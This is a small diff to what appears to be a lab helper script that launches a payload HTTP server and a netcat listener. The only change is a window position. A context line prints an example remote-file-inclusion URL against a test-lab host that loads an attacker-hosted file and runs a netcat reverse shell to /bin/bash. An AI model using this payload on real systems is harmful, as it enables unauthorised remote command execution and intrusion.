@@ -48,7 +48,7 @@ check_port $NC_PORT
 
 xterm -T "Payload Server" -geometry 80x30+0+0 -hold -e "python3 -m http.server $HTTP_PORT" &
 
-xterm -T "NC Listener" -geometry 80x30+492+0 -hold -e \
+xterm -T "NC Listener" -geometry 80x30+494+0 -hold -e \
 "echo -e '${GREEN}Listening...${NC}'; 
  echo '--------------------------------------------------';
  echo 'Example: http://ninja.testlab.local/index.php?page=http://192.168.111.100/kabuk.txt?&cmd=nc -e /bin/bash 192.168.111.100 4444%00';
